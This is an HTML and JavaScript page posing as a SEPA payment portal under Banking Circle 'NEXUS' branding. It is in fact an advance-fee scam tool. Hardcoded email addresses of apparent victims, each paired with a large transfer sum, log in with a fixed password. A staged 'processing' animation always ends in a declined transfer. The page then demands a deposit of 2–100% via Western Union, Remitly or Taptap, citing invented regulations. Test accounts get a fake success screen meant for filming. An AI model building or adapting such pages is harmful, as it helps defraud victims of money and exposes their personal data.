<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>SEPA receipt</title>
  <style>
    :root{
      --bg1:#eef2f7; --bg2:#f8fafc; --card:#fff;
      --text:#0f172a; --muted:#6b7280; --border:#d1d5db;
      --primary:#0070f3; --primary2:#0059c1;
      --danger:#d93025; --dangerBg:#fdecea;
      --success:#188038; --successBg:#e6f4ea;
      --warnBg:#fff8e1; --warnBorder:#fbbc04;
      --nexusBg:#ecfeff; --nexusBorder:#a5f3fc;
    }
    *{box-sizing:border-box;}
    body{
      margin:0;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      background:linear-gradient(135deg,var(--bg1),var(--bg2));
      min-height:100svh;
      display:flex;
      justify-content:center;
      align-items:center;
      padding:16px;
      padding-top:calc(16px + env(safe-area-inset-top));
      padding-bottom:calc(16px + env(safe-area-inset-bottom));
    }
    .card{
      width:min(560px, 100%);
      background:var(--card);
      border-radius:16px;
      box-shadow:0 20px 40px rgba(0,0,0,.12);
      padding:20px;
    }
    h1,h2{margin:0; text-align:center;}
    h1{font-size:20px; margin-bottom:6px;}
    h2{font-size:18px; margin-bottom:6px;}
    .sub{margin:0 0 14px; text-align:center; font-size:12px; color:var(--muted);}

    .banner{
      display:none;
      text-align:center;
      font-weight:900;
      color:var(--text);
      background:var(--nexusBg);
      border:1px solid var(--nexusBorder);
      padding:12px;
      border-radius:14px;
      margin:0 0 14px;
    }
    .banner small{display:block; font-weight:800; color:#155e75; margin-top:2px;}

    label{display:block; font-size:12px; color:#4b5563; font-weight:800;}
    input,select{
      width:100%;
      padding:12px;
      margin:8px 0 8px;
      border-radius:12px;
      border:1px solid var(--border);
      background:#fff;
      font-size:16px;
      outline:none;
    }
    .field{margin-bottom:12px;}
    .err{display:none; font-size:12px; color:#b91c1c; margin:0 0 6px; font-weight:700;}
    input.invalid,select.invalid{border-color:#ef4444; background:#fff5f5;}

    .btn{
      width:100%;
      padding:14px;
      border-radius:14px;
      border:none;
      font-size:16px;
      font-weight:900;
      cursor:pointer;
      touch-action:manipulation;
    }
    .btn-primary{background:var(--primary); color:#fff;}
    .btn-primary:hover{background:var(--primary2);}
    .btn-dark{background:#111827; color:#fff; margin-top:12px;}
    .btn-dark:hover{background:#0b1220;}
    .btn-ghost{
      margin-top:10px; background:#fff; border:1px solid var(--border); color:#111827;
      font-size:14px; padding:12px; font-weight:900;
    }
    .btn-ghost:hover{background:#f9fafb;}
    .hidden{display:none;}

    .bank-select{
      max-height:min(58svh, 520px);
      overflow:auto;
      -webkit-overflow-scrolling:touch;
      padding-right:2px;
    }
    .bank-select button{
      width:100%;
      margin:6px 0;
      padding:12px;
      border-radius:12px;
      border:1px solid #ddd;
      background:#f5f7fa;
      cursor:pointer;
      font-weight:900;
      font-size:16px;
      touch-action:manipulation;
      text-align:left;
    }
    .bank-select button:hover{background:#e9edf3;}
    .pill{
      background:#f3f4f6; border:1px solid #e5e7eb; padding:10px 12px;
      border-radius:999px; text-align:center; font-weight:900; margin-bottom:14px;
      font-size:14px;
    }

    .loader{ text-align:center; font-weight:900; margin:14px 0; color:#374151; }
    .progress-wrap{background:#eef2f7;border-radius:999px;height:12px;overflow:hidden;border:1px solid #d9e0ea;}
    .progress-bar{height:12px;width:0%;background:var(--primary);transition:width .12s linear;}
    .progress-label{font-size:12px;text-align:center;color:var(--muted);margin-top:8px;font-weight:900;}

    .error{
      border-left:6px solid var(--danger);
      background:var(--dangerBg);
      padding:16px;
      border-radius:14px;
      color:#5f2120;
    }

    .success{
      border-left:6px solid var(--success);
      background:var(--successBg);
      padding:16px;
      border-radius:14px;
      color:#0f3d22;
    }

    .meta,.legal{margin-top:10px;padding:12px;border-radius:12px;font-size:12px;line-height:1.45;}
    .meta{background:#f3f4f6;border:1px solid #e5e7eb;color:#111827;}
    .legal{background:var(--warnBg);border-left:4px solid var(--warnBorder); color:#3b2f00;}
    .note{font-size:11px;color:#9ca3af;text-align:center;margin-top:12px;}

    .iban-status{display:none;font-size:12px;color:#374151;margin-top:6px;font-weight:900;}
    .iban-bar{display:none;height:8px;background:#eef2f7;border:1px solid #d9e0ea;border-radius:999px;overflow:hidden;margin-top:8px;}
    .iban-bar>div{height:100%;width:25%;background:var(--primary);border-radius:999px;animation:ibanMove .9s linear infinite;}
    @keyframes ibanMove{0%{transform:translateX(-120%);}100%{transform:translateX(420%);}}
    .ok{color:#047857;}

    @media (max-width:360px){
      .card{padding:16px;}
      .btn{padding:13px;}
      input,select{padding:11px;}
    }

    /* Advice modal (in-page, no file export) */
    .modal{
      position:fixed; inset:0;
      display:none; align-items:center; justify-content:center;
      background:rgba(15,23,42,.55);
      padding:24px;
      z-index:9999;
    }
    .modal.open{display:flex;}
    .modal-card{
      width:min(560px, 92vw);
      background:var(--card);
      border:1px solid var(--border);
      border-radius:18px;
      box-shadow:0 20px 60px rgba(2,6,23,.25);
      overflow:hidden;
    }
    .modal-head{
      padding:14px 16px;
      border-bottom:1px solid var(--border);
      background:#f8fafc;
      display:flex; align-items:center; justify-content:space-between;
      gap:12px;
    }
    .modal-title{font-weight:700;}
    .modal-body{padding:16px; font-size:14px; line-height:1.5;}
    .kv{
      border:1px solid #e5e7eb; border-radius:14px;
      padding:12px; background:#fbfdff;
    }
    .kv-row{display:flex; justify-content:space-between; gap:14px; padding:6px 0; border-bottom:1px dashed #e5e7eb;}
    .kv-row:last-child{border-bottom:none;}
    .kv-key{color:#475569;}
    .kv-val{font-weight:700; color:#0f172a; text-align:right;}
  </style>
</head>
<body>
<div class="card">
  <h1>üîê Sepa Payments</h1>
  <div class="sub">SEPA Portal ‚Ä¢ Receipt Confirmation</div>

  <div class="banner" id="nexusBanner">Nexus <small>(Banking Circle)</small></div>

  <!-- LOGIN -->
  <div id="screenLogin">
    <h2>Log in</h2>
    <div class="sub" style="margin-bottom:10px;">Enter credentials to continue</div>

    <div class="field">
      <label>Username</label>
      <input id="loginUser" placeholder="Username" autocomplete="username">
    </div>

    <div class="field">
      <label>Password</label>
      <input id="loginPass" type="password" placeholder="Password" autocomplete="current-password">
      <div class="err" id="errLogin">Wrong credentials.</div>
    </div>

    <button class="btn btn-primary" onclick="doLogin()">Log in</button>
    <div class="note">Account authentication.</div>
  </div>

  <!-- BANK CHOOSE -->
  <div id="screenBank" class="hidden">
    <h2>Select your bank</h2>
    <div class="sub">Choose a bank to continue to SEPA details</div>

    <div class="bank-select" id="bankList">
      <button onclick="selectBank('NEXUS Partner Bank ‚Äî Luxembourg')">NEXUS Partner Bank ‚Äî Luxembourg</button>
      <button onclick="selectBank('NEXUS Partner Bank ‚Äî Germany')">NEXUS Partner Bank ‚Äî Germany</button>
      <button onclick="selectBank('NEXUS Partner Bank ‚Äî Italy')">NEXUS Partner Bank ‚Äî Italy</button>

      <button onclick="selectBank('Deutsche Bank')">Deutsche Bank</button>
      <button onclick="selectBank('Commerzbank')">Commerzbank</button>
      <button onclick="selectBank('UniCredit')">UniCredit</button>
      <button onclick="selectBank('HSBC')">HSBC</button>
      <button onclick="selectBank('BNP Paribas')">BNP Paribas</button>
      <button onclick="selectBank('Soci√©t√© G√©n√©rale')">Soci√©t√© G√©n√©rale</button>
      <button onclick="selectBank('ING')">ING</button>
      <button onclick="selectBank('Rabobank')">Rabobank</button>
      <button onclick="selectBank('Santander')">Santander</button>
      <button onclick="selectBank('BBVA')">BBVA</button>
      <button onclick="selectBank('Nordea')">Nordea</button>
      <button onclick="selectBank('Swedbank')">Swedbank</button>
      <button onclick="selectBank('Danske Bank')">Danske Bank</button>
      <button onclick="selectBank('Erste Group')">Erste Group</button>
      <button onclick="selectBank('Raiffeisen Bank')">Raiffeisen Bank</button>
      <button onclick="selectBank('PKO Bank Polski')">PKO Bank Polski</button>
      <button onclick="selectBank('UBS')">UBS</button>
    </div>

    <button class="btn btn-ghost" onclick="goTo('screenLogin')">Back</button>
  </div>

  <!-- SEPA FORM -->
  <div id="screenForm" class="hidden">
    <div id="selectedBank" class="pill"></div>

    <div class="field">
      <label>Country</label>
      <select id="country">
        <option value="">Select country‚Ä¶</option>
        <option>Albania</option><option>Andorra</option><option>Armenia</option><option>Austria</option><option>Azerbaijan</option>
        <option>Belarus</option><option>Belgium</option><option>Bosnia and Herzegovina</option><option>Bulgaria</option>
        <option>Croatia</option><option>Cyprus</option><option>Czechia</option><option>Denmark</option>
        <option>Estonia</option><option>Finland</option><option>France</option><option>Georgia</option><option>Germany</option>
        <option>Greece</option><option>Hungary</option><option>Iceland</option><option>Ireland</option><option>Italy</option>
        <option>Kazakhstan</option><option>Kosovo</option><option>Latvia</option><option>Liechtenstein</option><option>Lithuania</option>
        <option>Luxembourg</option><option>Malta</option><option>Moldova</option><option>Monaco</option><option>Montenegro</option>
        <option>Netherlands</option><option>North Macedonia</option><option>Norway</option><option>Poland</option><option>Portugal</option>
        <option>Romania</option><option>Russia</option><option>San Marino</option><option>Serbia</option><option>Slovakia</option>
        <option>Slovenia</option><option>Spain</option><option>Sweden</option><option>Switzerland</option><option>T√ºrkiye</option>
        <option>Ukraine</option><option>United Kingdom</option><option>Vatican City</option>
      </select>
      <div class="err" id="errCountry">Please select a country.</div>
    </div>

    <div class="field">
      <label>Official account name</label>
      <input id="name" placeholder="Full name" autocomplete="name">
      <div class="err" id="errName">Please enter the official account name.</div>
    </div>

    <div class="field">
      <label>IBAN</label>
      <input id="iban" placeholder="IBAN" autocomplete="off">
      <div class="err" id="errIban">IBAN looks invalid. (check: 15‚Äì34 chars, A‚ÄìZ/0‚Äì9, starts with 2 letters.)</div>
      <div class="iban-status" id="ibanStatus">Validating IBAN‚Ä¶</div>
      <div class="iban-bar" id="ibanBar"><div></div></div>
    </div>

    <div class="field">
      <label>BIC / SWIFT</label>
      <input id="bic" placeholder="BIC / SWIFT" autocomplete="off">
      <div class="err" id="errBic">BIC/SWIFT must be 8 or 11 characters (A‚ÄìZ/0‚Äì9).</div>
    </div>

    <div class="field">
      <label>Amount</label>
      <input id="amount" disabled>
    </div>

    <button class="btn btn-primary" onclick="submitAndStart()">Continue</button>
    <button class="btn btn-ghost" onclick="goTo('screenBank')">Change bank</button>

    <div class="note">Bank Verification</div>
  </div>

  <!-- LOADING -->
  <div id="screenLoading" class="hidden">
    <h2>Processing</h2>
    <div class="sub">Please wait‚Ä¶</div>

    <div class="loader" id="statusText">üîê Connecting to bank‚Ä¶</div>
    <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
    <div class="progress-label" id="progressLabel">0%</div>
  </div>

  <!-- DECLINE RESULT -->
  <div id="screenDecline" class="hidden">
    <div class="error">
      <h3 style="margin:0 0 8px;">‚ùå Transfer Failed</h3>

      <p style="margin:0 0 10px;">
        <strong>Reason:</strong> <span id="declineReasonText"></span>
      </p>

      <div class="meta">
        Full sum: <strong><span id="metaFullSumDecline">0.00</span> Euro</strong><br>
        Required deposit (<span id="depositPctDecline">0</span>%): <strong><span id="metaDepositDecline">0.00</span> Euro</strong><br>
        Network: <strong>NEXUS (Banking Circle)</strong>
      </div>

      <div class="legal">
        <strong>Legal Notice:</strong><br>
        Under <strong><span id="regulationRefDecline">Regulation X</span></strong> of the
        <em><span id="regulationTitleDecline">Imaginary Currency Settlement Framework 2004</span></em>,
        all Euro-denominated obligations must be discharged before electronic transfers may proceed.
      </div>

      <button class="btn btn-dark" onclick="startAttempt()">Retry Transfer</button>
      <button class="btn btn-ghost" onclick="goTo('screenForm')">Back to details</button>
    </div>

    <div class="note">Transaction Confirmation</div>
  </div>

  <!-- SUCCESS RESULT -->
  <div id="screenSuccess" class="hidden">
    <div class="success">
      <h3 style="margin:0 0 8px;">‚úÖ Verification Completed</h3>

      <p style="margin:0 0 10px;">
        <strong>Status:</strong> Liquidity assurance cleared. Settlement release is queued for same‚Äëday dispatch, subject to beneficiary-bank acceptance.
      </p>

      <div class="meta">
        Full sum: <strong><span id="metaFullSumSuccess">0.00</span> Euro</strong><br>
        Liquidity assurance: <strong>Verified</strong><br>
        Network: <strong>NEXUS (Banking Circle)</strong>
      </div>

      <div class="legal">
        <strong>Compliance Notice:</strong><br>
        Processing is conducted under <strong><span id="regulationRefSuccess">Regulation X</span></strong> of the
        <em><span id="regulationTitleSuccess">High‚ÄëValue Transfer Safeguards Directive 2025</span></em>,
        with settlement sequencing and obligation discharge validated prior to release.
      </div>

      <button class="btn btn-dark" onclick="openAdvice()">View transaction advice</button>
      <button class="btn btn-ghost" onclick="goTo('screenForm')">Back to details</button>
    </div>

    <div class="note">Transaction Confirmation</div>
  </div>
</div>

<script>
  // ---------------------------
  // Screen navigation
  // ---------------------------
  const screens = ["screenLogin","screenBank","screenForm","screenLoading","screenDecline","screenSuccess"];
  function goTo(id){
    screens.forEach(s => document.getElementById(s).classList.toggle("hidden", s !== id));
    window.scrollTo({top:0, behavior:"smooth"});
  }

  // ---------------------------
  // NEXUS banner
  // ---------------------------
  const nexusBanner = document.getElementById("nexusBanner");
  function setNexusVisible(v){ nexusBanner.style.display = v ? "block" : "none"; }

  // ---------------------------
  // STRICT LOGIN RULES
  // ---------------------------
  const LOGIN_PASSWORD = "A1B2C3";

  // Combined rule:
  // - First profile in the map is ALWAYS DECLINE
  // - All other profiles are ALWAYS SUCCESS
  //
  // You can override per user by adding: outcome: "decline" or outcome: "success"
  // Test accounts that ALWAYS reach the successful settlement screen
  // (Edit this list to control who passes.)
  const SUCCESS_USERS = new Set([
    "test1","test2","test3","test4","test5",
    "test6","test7","test8","test9","test10",
    "test11","test12","test13","test14","test15","office@dee-mark.co.uk",
  ]);

  const USER_PROFILE_MAP = new Map([
    ["olaoba@live.co.uk", {
      amount: 120606.00,
      depositPct: 10,
      reason: "Client is obligated to provide a standard compliance liquidity verification of 10% amount in their Taptap, Western union or Remitly account.",
      regulationRef: "Regulation 9(2)",
      regulationTitle: "Sepa Settlement & Verification Code 2004",
      outcome: "decline"
    }],
    ["chrisandnick97@gmail.com", {
      amount: 82450.00,
      depositPct: 5,
      reason: "Client requires a refundable tax deposit prior to settlement clearance.",
      regulationRef: "Regulation 12(4)",
      regulationTitle: "Sepa Payments Conduct Annex 2011"
    }],
    ["stewartw1964@yahoo.co.uk", {
      amount: 40650.00,
      depositPct: 5,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing.",
      regulationRef: "Regulation 12(4)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["iangrinsted@gmail.com", {
      amount: 23600.00,
      depositPct: 10,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing.",
      regulationRef: "Regulation 12(4)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["ayoope02@yahoo.com", {
      amount: 46426.00,
      depositPct: 100,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing.",
      regulationRef: "Regulation 4(6)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["office@dee-mark.co.uk", {
      amount: 40630.00,
      depositPct: 18,
      reason: "Corporate beneficiary pending settlement guarantee verification deposit.",
      regulationRef: "Regulation 22(7)",
      regulationTitle: "Corporate Settlement Assurance Rules 2009"
    }],
    ["johnnie.wales@gmail.com", {
      amount: 47543.00,
      depositPct: 5,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing.",
      regulationRef: "Regulation 41(2)",
      regulationTitle: "High-Value Transfer Safeguards Directive 2025"
    }],
    ["cyrusfa@talk21.com", {
      amount: 17859.00,
      depositPct: 10,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing",
      regulationRef: "Regulation 44(2)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["adrian.ward10@btinternet.com", {
      amount: 29918.00,
      depositPct: 5,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing",
      regulationRef: "Regulation 44(2)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["steveclarry@yahoo.co.uk", {
      amount: 249981.00,
      depositPct: 2,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing",
      regulationRef: "Regulation 44(2)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["daahsa16@gmail.com", {
      amount: 26500.00,
      depositPct: 30,
      reason: "High-value transfer requires refundable tax to be paid for the confirmation",
      regulationRef: "Regulation 44(2)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }],
    ["sonia3", {
      amount: 17859.00,
      depositPct: 10,
      reason: "High-value transfer requires mandatory liquidity assurance deposit prior to processing",
      regulationRef: "Regulation 44(2)",
      regulationTitle: "Sepa Payments Conduct Annex 2026"
    }]
  ]);
  // Add 15 simple demo users used for filming close-ups.
  // These are always successful by default.
  for (let i = 1; i <= 15; i++) {
    const u = `test${i}`;
    if (!USER_PROFILE_MAP.has(u)) {
      USER_PROFILE_MAP.set(u, {
        amount: 25000 + (i * 3175),
        depositPct: 0,
        reason: "Settlement cleared following standard liquidity verification.",
        regulationRef: "Regulation 3(1)",
        regulationTitle: "Cross-Border Settlement Protocol 2019",
        outcome: "success"
      });
    }
  }



  function normalizeLogin(s){
    return (s || "").trim().toLowerCase().replace(/\s+/g, " ");
  }

  function formatEUR(x){
    return "‚Ç¨" + x.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " EUR";
  }

  // Current session profile
  let currentUser = "";
  let currentAmount = 0;
  let currentDepositPct = 0;
  let currentReason = "";
  let currentRegRef = "";
  let currentRegTitle = "";
  let currentOutcome = "success";
  let selectedBank = "";

  function decideOutcome(userKey, profile){
    // Only test accounts pass; all other accounts are declined (for the story).
    const key = String(userKey || "").toLowerCase().trim();
    return SUCCESS_USERS.has(key) ? "success" : "decline";
  }

  function updateUiFromProfile(){
    // Form amount
    const amountBox = document.getElementById("amount");
    if (amountBox) amountBox.value = formatEUR(currentAmount);

    // Shared values
    const amtStr = currentAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });

    // Decline screen values
    const reasonBox = document.getElementById("declineReasonText");
    const pctBox = document.getElementById("depositPctDecline");
    const fullBoxD = document.getElementById("metaFullSumDecline");
    const depBoxD  = document.getElementById("metaDepositDecline");
    const regRefD = document.getElementById("regulationRefDecline");
    const regTitleD = document.getElementById("regulationTitleDecline");

    const depositValue = currentAmount * (currentDepositPct / 100);

    if (reasonBox) reasonBox.textContent = currentReason;
    if (pctBox) pctBox.textContent = String(currentDepositPct);
    if (fullBoxD) fullBoxD.textContent = amtStr;
    if (depBoxD) depBoxD.textContent = depositValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    if (regRefD) regRefD.textContent = currentRegRef;
    if (regTitleD) regTitleD.textContent = currentRegTitle;

    // Success screen values
    const fullBoxS = document.getElementById("metaFullSumSuccess");
    const regRefS = document.getElementById("regulationRefSuccess");
    const regTitleS = document.getElementById("regulationTitleSuccess");
    if (fullBoxS) fullBoxS.textContent = amtStr;
    if (regRefS) regRefS.textContent = currentRegRef;
    if (regTitleS) regTitleS.textContent = currentRegTitle;
  }

  function doLogin(){
    const rawUser = document.getElementById("loginUser").value;
    const rawPass = document.getElementById("loginPass").value;

    const userKey = normalizeLogin(rawUser);
    const passOk = rawPass === LOGIN_PASSWORD;
    const userOk = USER_PROFILE_MAP.has(userKey);

    const ok = userOk && passOk;
    document.getElementById("errLogin").style.display = ok ? "none" : "block";
    if(!ok) return;

    const profile = USER_PROFILE_MAP.get(userKey);
    currentUser = rawUser.trim(); // keep original for display
    currentAmount = Number(profile.amount) || 0;
    currentDepositPct = Number(profile.depositPct) || 0;
    currentOutcome = decideOutcome(userKey, profile);

    // For decline, keep the "required deposit" language; for success, keep it cleaner
    if(currentOutcome === "decline"){
      currentReason = (profile.reason || "") + ` (Required deposit: ${currentDepositPct}%.)`;
    }else{
      currentReason = (profile.reason || "");
    }

    currentRegRef = profile.regulationRef || "Regulation X";
    currentRegTitle = profile.regulationTitle || "High-Value Transfer Safeguards Directive 2025";

    updateUiFromProfile();
    setNexusVisible(false);
    goTo("screenBank");
  }

  // ---------------------------
  // Bank selection
  // ---------------------------
  function selectBank(name){
    selectedBank = name;
    document.getElementById("selectedBank").textContent = "Selected bank: " + name;
    goTo("screenForm");
  }

  // ---------------------------
  // Form validation
  // ---------------------------
  const elCountry = document.getElementById("country");
  const elName = document.getElementById("name");
  const elIban = document.getElementById("iban");
  const elBic = document.getElementById("bic");

  const errCountry = document.getElementById("errCountry");
  const errName = document.getElementById("errName");
  const errIban = document.getElementById("errIban");
  const errBic = document.getElementById("errBic");

  const ibanStatus = document.getElementById("ibanStatus");
  const ibanBar = document.getElementById("ibanBar");

  function showErr(inputEl, errEl, on){
    if(on){ inputEl.classList.add("invalid"); errEl.style.display = "block"; }
    else { inputEl.classList.remove("invalid"); errEl.style.display = "none"; }
  }
  function cleanIban(s){ return (s||"").replace(/\s+/g,"").toUpperCase(); }

  function validateCountry(){
    const ok = elCountry.value.trim() !== "";
    errCountry.style.display = ok ? "none" : "block";
    if(!ok) elCountry.classList.add("invalid"); else elCountry.classList.remove("invalid");
    return ok;
  }
  function validateName(){
    const ok = elName.value.trim().length >= 3;
    showErr(elName, errName, elName.value.trim()!=="" && !ok);
    return ok;
  }
  function validateIban(){
    const iban = cleanIban(elIban.value);
    const ok = /^[A-Z]{2}[A-Z0-9]{13,32}$/.test(iban);
    showErr(elIban, errIban, elIban.value.trim()!=="" && !ok);
    return ok;
  }
  function validateBic(){
    const bic = (elBic.value||"").replace(/\s+/g,"").toUpperCase();
    const ok = /^[A-Z0-9]{8}([A-Z0-9]{3})?$/.test(bic);
    showErr(elBic, errBic, elBic.value.trim()!=="" && !ok);
    return ok;
  }

  // ---------------------------
  // IBAN validation animation
  // ---------------------------
  let ibanAnimTimer = null;
  function startIbanAnimation(){
    if(ibanAnimTimer) clearTimeout(ibanAnimTimer);
    setNexusVisible(false);

    if(elIban.value.trim()===""){
      ibanStatus.style.display="none";
      ibanBar.style.display="none";
      return;
    }

    ibanStatus.textContent="Validating IBAN‚Ä¶";
    ibanStatus.classList.remove("ok");
    ibanStatus.style.display="block";
    ibanBar.style.display="block";

    const delay = Math.floor(Math.random()*800)+800;
    ibanAnimTimer = setTimeout(()=>{
      const ok = validateIban();
      ibanStatus.textContent = ok ? "IBAN validated ‚úì" : "IBAN validation failed";
      if(ok) ibanStatus.classList.add("ok");
      if(ok) setNexusVisible(true);
      setTimeout(()=>{ ibanBar.style.display="none"; }, 450);
    }, delay);
  }

  elCountry.addEventListener("change", ()=>{ errCountry.style.display="none"; elCountry.classList.remove("invalid"); });
  elName.addEventListener("input", ()=> showErr(elName, errName, false));
  elBic.addEventListener("input", ()=> showErr(elBic, errBic, false));
  elIban.addEventListener("input", ()=>{ showErr(elIban, errIban, false); startIbanAnimation(); });
  elIban.addEventListener("blur", startIbanAnimation);

  function submitAndStart(){
    const countryOk = validateCountry();
    const nameOk = validateName();
    const ibanOk = validateIban();
    const bicOk  = validateBic();

    if(!countryOk || !nameOk || !ibanOk || !bicOk){
      if(elName.value.trim()==="") showErr(elName, errName, true);
      if(elIban.value.trim()==="") showErr(elIban, errIban, true);
      if(elBic.value.trim()==="") showErr(elBic, errBic, true);
      return;
    }

    setNexusVisible(true);
    startAttempt();
  }

  // ---------------------------
  // Loading -> routes to Decline or Success (deterministic per user)
  // ---------------------------
  const steps = [
    "üîê Connecting to bank‚Ä¶",
    "üßæ Verifying beneficiary‚Ä¶",
    "üõ°Ô∏è Running compliance checks‚Ä¶",
    "üì° Contacting SEPA rails‚Ä¶",
    "üßÆ Calculating fees‚Ä¶",
    "üß∑ Finalising transfer‚Ä¶"
  ];
  let timer = null;

  function startAttempt(){
    clearInterval(timer);
    setNexusVisible(true);
    updateUiFromProfile();
    goTo("screenLoading");

    const total = Math.random()*5000 + 5000;
    const start = Date.now();

    document.getElementById("progressBar").style.width="0%";
    document.getElementById("progressLabel").textContent="0%";
    document.getElementById("statusText").textContent=steps[0];

    timer = setInterval(()=>{
      const elapsed = Date.now() - start;
      const p = Math.min(99, Math.floor(elapsed/total*100));

      document.getElementById("progressBar").style.width = p + "%";
      document.getElementById("progressLabel").textContent = p + "%";
      document.getElementById("statusText").textContent =
        steps[Math.min(steps.length-1, Math.floor(p/18))];

      if(elapsed >= total){
        clearInterval(timer);
        setNexusVisible(true);
        updateUiFromProfile();

        if(currentOutcome === "decline") goTo("screenDecline");
        else goTo("screenSuccess");
      }
    }, 40);
  }

  // Initial state
  setNexusVisible(false);

  function openAdvice(){
    const amt = document.getElementById('metaFullSumSuccess')?.textContent || '0.00';
    document.getElementById('adviceAmount').textContent = amt;

    const seed = String(amt).replace(/[^0-9]/g,'').slice(-6).padStart(6,'0');
    document.getElementById('adviceRef').textContent = 'TC-NEXUS-' + seed;

    const m = document.getElementById('adviceModal');
    m.classList.add('open');
    m.setAttribute('aria-hidden','false');
  }
  function closeAdvice(){
    const m = document.getElementById('adviceModal');
    m.classList.remove('open');
    m.setAttribute('aria-hidden','true');
  }
  document.addEventListener('click', (e)=>{
    const m = document.getElementById('adviceModal');
    if(!m) return;
    if(m.classList.contains('open') && e.target === m) closeAdvice();
  });
  document.addEventListener('keydown', (e)=>{
    if(e.key === 'Escape') closeAdvice();
  });
</script>

<!-- Transaction advice modal (no download) -->
<div class="modal" id="adviceModal" aria-hidden="true">
  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="adviceTitle">
    <div class="modal-head">
      <div class="modal-title" id="adviceTitle">Transaction Advice ‚Äî SEPA Release</div>
      <button class="btn btn-ghost" style="margin:0; padding:8px 12px;" onclick="closeAdvice()">Close</button>
    </div>
    <div class="modal-body">
      <div class="kv">
        <div class="kv-row"><div class="kv-key">Advice reference</div><div class="kv-val" id="adviceRef">TC-NEXUS-000000</div></div>
        <div class="kv-row"><div class="kv-key">Network</div><div class="kv-val">NEXUS (Banking Circle)</div></div>
        <div class="kv-row"><div class="kv-key">Amount</div><div class="kv-val"><span id="adviceAmount">0.00</span> EUR</div></div>
        <div class="kv-row"><div class="kv-key">Liquidity assurance</div><div class="kv-val">Verified</div></div>
        <div class="kv-row"><div class="kv-key">Release window</div><div class="kv-val">Same‚Äëday dispatch</div></div>
        <div class="kv-row"><div class="kv-key">Settlement status</div><div class="kv-val">Queued</div></div>
      </div>

      <p style="margin:12px 0 0; color:#64748b; font-size:12px;">
        This advice reflects the current release state within the Trading Centre settlement workflow.
      </p>
    </div>
  </div>
</div>

</body>
</html>
